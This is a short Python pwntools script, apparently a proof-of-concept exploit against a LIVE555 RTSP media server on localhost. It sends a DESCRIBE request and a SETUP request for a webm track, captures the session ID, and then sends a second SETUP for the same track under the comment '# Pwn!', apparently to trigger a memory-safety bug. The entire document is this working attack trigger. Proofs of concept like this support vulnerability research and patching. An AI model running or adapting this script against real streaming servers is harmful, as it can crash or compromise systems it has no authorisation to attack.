from pwn import *

io = remote("127.0.0.1", 8554)
io.send(b"DESCRIBE rtsp://127.0.0.1:8554/webmFileTest RTSP/1.0\r\nCSeq: 2\r\nUser-Agent: ./testRTSPClient (LIVE555 Streaming Media v2018.08.28)\r\nAccept: application/sdp\r\n\r\n")
io.send(b"SETUP rtsp://127.0.0.1:8554/webmFileTest/track2 RTSP/1.0\r\nCSeq: 3\r\nUser-Agent: ./testRTSPClient (LIVE555 Streaming Media v2018.08.28)\r\nTransport: RTP/AVP;unicast;client_port=50494-50495\r\n\r\n")
io.recvuntil("Session: ")
sessionID = io.recv(8)
io.recv()

# Pwn!
io.send(b"SETUP rtsp://127.0.0.1:8554/webmFileTest/track2 RTSP/1.0\r\nCSeq: 4\r\nUser-Agent: ./testRTSPClient (LIVE555 Streaming Media v2018.08.28)\r\nTransport: RTP/AVP;unicast;client_port=60854-60855\r\nSession: " + sessionID + b"\r\n\r\n")